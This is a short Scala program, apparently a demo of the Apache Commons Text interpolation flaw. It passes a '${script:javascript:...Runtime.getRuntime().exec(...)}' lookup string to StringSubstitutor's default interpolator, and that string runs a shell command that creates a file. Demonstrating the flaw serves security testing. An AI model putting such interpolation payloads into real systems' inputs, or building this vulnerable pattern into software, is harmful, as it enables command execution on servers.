package stuff

import org.apache.commons.text.StringSubstitutor

object TheApp {
  def main(args: Array[String]): Unit = {
    println("->stuff.TheApp.main()")

    // Taken from app-java-demo
    val interpolator = StringSubstitutor.createInterpolator();
    val out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ./foo')}");
    System.out.println(out);

  }
}
